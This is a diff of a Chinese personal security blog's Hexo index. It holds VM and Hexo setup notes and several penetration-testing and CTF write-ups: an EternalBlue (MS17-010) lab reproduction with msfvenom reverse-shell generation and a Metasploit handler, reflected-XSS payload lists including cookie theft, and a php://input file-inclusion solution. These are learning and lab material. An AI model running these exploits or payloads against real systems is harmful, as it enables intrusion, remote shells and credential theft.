+<p>要使ssh开机启动，命令为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
+<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
+<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
+<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
+<p>确定保存后，在v2ray界面底部查看代理地址</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
+<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
+<p>最后设置浏览器代理为系统代理即可。</p>
+<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
 ]]></content>
       <categories>
         <category>环境配置</category>
       </categories>
       <tags>
+        <tag>linux</tag>
         <tag>环境配置</tag>
-        <tag>hexo</tag>
+        <tag>kali</tag>
+        <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
@@ -712,6 +707,70 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo博客搭建</title>
+    <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
+<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
+<p><strong>npm to cnpm</strong></p>
+<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
+<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
+<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
+<p>安装完成即可，没有必要配置ssh</p>
+<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
+<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
+<p>攻击机：Kali Linux	(192.168.233.128)</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
+<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
+<p>关闭靶机防火墙</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
+<p>在window server 2012中启动Guest账号</p>
+<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
+<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
+<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
+<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
+<p>下载到kali后后使用NASM工具对asm代码编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
+<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
+<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
+<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
+<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
+<p>保存退出，然后运行该脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
+<p>运行成功，此时返回msf命令行</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
+<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>渗透测试基础</title>
     <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h2 id="渗透思路-流程"><a class="header-anchor" href="#渗透思路-流程"></a>渗透思路/流程</h2>
@@ -890,65 +949,6 @@
       <categories>
         <category>渗透</category>
       </categories>
-  </entry>
-  <entry>
-    <title>kali(Debian)虚拟机的网络配置</title>
-    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
-<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
-<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
-<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
-<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
-<p>然后配置网卡eth0</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
-<p>若要设置IP为静态的，则插入以下几行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
-<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
-<p><code>:wq</code>保存退出之后，重启网卡</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
-<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
-<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
-<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
-<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
-<p>一般来说，kali默认已经安装了SSH</p>
-<p>首先查看SSH状态</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
-<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
-<p>然后修改sshd_config</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
-<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
-<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
-<p>保存退出。</p>
-<p>重启SSH服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
-<p>要使ssh开机启动，命令为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
-<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
-<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
-<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
-<p>确定保存后，在v2ray界面底部查看代理地址</p>
-<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
-<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
-<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
-<p>最后设置浏览器代理为系统代理即可。</p>
-<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>环境配置</tag>
-        <tag>kali</tag>
-        <tag>SSH</tag>
-      </tags>
   </entry>
   <entry>
     <title>Linux系统加固</title>
@@ -1186,44 +1186,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XSS</title>
-    <url>/2020/08/03/CTF/Web/XSS/</url>
-    <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
-<p><strong>payload:</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p><strong>一些绕过方法：</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 空格过滤：使用左斜线/代替空格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="XSS的防御"><a class="header-anchor" href="#XSS的防御"></a>XSS的防御</h2>
-<h3 id="过滤输入"><a class="header-anchor" href="#过滤输入"></a>过滤输入</h3>
-<p>对输入和URL参数进行过滤(白名单和黑名单)</p>
-<h3 id="转义输出"><a class="header-anchor" href="#转义输出"></a>转义输出</h3>
-<p><strong>1&gt;</strong> 作为body文本输出，作为html标签的属性输出：</p>
-<p>比如：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>$&#123;username&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>,</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">c:out</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>此时的转义规则如下：</p>
-<p>&lt; 转成 <code>&amp;lt;</code></p>
-<p>&gt; 转成 <code>&amp;gt;</code></p>
-<p>&amp; 转成 <code>&amp;amp;</code></p>
-<p>&quot; 转成 <code>&amp;quot;</code></p>
-<p>’ 转成 <code>&amp;#39;</code></p>
-<p><strong>2&gt;</strong> javascript事件</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"button"</span> onclick=<span class="string">'go_to_url("$&#123;myUrl&#125;");'</span> /&gt;</span><br></pre></td></tr></table></figure>
-<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
-<p>\ 转成<code>\\</code></p>
-<p>/ 转成 <code>\/</code></p>
-<p>; 转成 <code>；</code>(全角分号)</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>CTF</tag>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>代码审计</title>
     <url>/2020/08/23/CTF/Web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
     <content><![CDATA[<h2 id="PHP函数漏洞及其绕过姿势"><a class="header-anchor" href="#PHP函数漏洞及其绕过姿势"></a>PHP函数漏洞及其绕过姿势</h2>
@@ -1312,6 +1274,72 @@
       </tags>
   </entry>
   <entry>
+    <title>XSS</title>
+    <url>/2020/08/03/CTF/Web/XSS/</url>
+    <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>一些绕过方法：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 空格过滤：使用左斜线/代替空格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="XSS的防御"><a class="header-anchor" href="#XSS的防御"></a>XSS的防御</h2>
+<h3 id="过滤输入"><a class="header-anchor" href="#过滤输入"></a>过滤输入</h3>
+<p>对输入和URL参数进行过滤(白名单和黑名单)</p>
+<h3 id="转义输出"><a class="header-anchor" href="#转义输出"></a>转义输出</h3>
+<p><strong>1&gt;</strong> 作为body文本输出，作为html标签的属性输出：</p>
+<p>比如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>$&#123;username&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>,</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">c:out</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时的转义规则如下：</p>
+<p>&lt; 转成 <code>&amp;lt;</code></p>
+<p>&gt; 转成 <code>&amp;gt;</code></p>
+<p>&amp; 转成 <code>&amp;amp;</code></p>
+<p>&quot; 转成 <code>&amp;quot;</code></p>
+<p>’ 转成 <code>&amp;#39;</code></p>
+<p><strong>2&gt;</strong> javascript事件</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"button"</span> onclick=<span class="string">'go_to_url("$&#123;myUrl&#125;");'</span> /&gt;</span><br></pre></td></tr></table></figure>
+<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
+<p>\ 转成<code>\\</code></p>
+<p>/ 转成 <code>\/</code></p>
+<p>; 转成 <code>；</code>(全角分号)</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
+<p>简单的文件包含题。</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
+<p>在phpinfo中可以发现</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
+<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
+<p>尝试发现确实可行</p>
+<p>现在我们就可以任意执行php代码了</p>
+<p>对当前文件夹进行目录遍历</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
+<p>输出文件内容即可得到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传</title>
     <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
@@ -1368,31 +1396,100 @@
       </tags>
   </entry>
   <entry>
-    <title>文件包含</title>
-    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
-<p>简单的文件包含题。</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
-<p>在phpinfo中可以发现</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
-<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
-<p>尝试发现确实可行</p>
-<p>现在我们就可以任意执行php代码了</p>
-<p>对当前文件夹进行目录遍历</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
-<p>输出文件内容即可得到flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
+    <title>ACTF校赛Web</title>
+    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
+    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
